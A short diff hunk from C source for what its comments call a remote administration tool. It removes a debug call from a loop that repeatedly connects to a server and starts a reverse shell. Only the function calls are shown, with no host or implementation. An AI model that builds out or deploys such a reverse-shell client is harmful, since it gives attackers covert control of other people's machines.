@@ -20,9 +20,6 @@ int main(int ac, char * av[])
 
 	setup(&m_s);			// setup the remote administration tool
 	while(1) {
-		#ifdef _DEBUG
-		debug(&m_s);
-		#endif
 		cnt(&m_s);		// connect to server
 		reverse_shell(&m_s);	// start the client handler
 		close_cnt(&m_s);
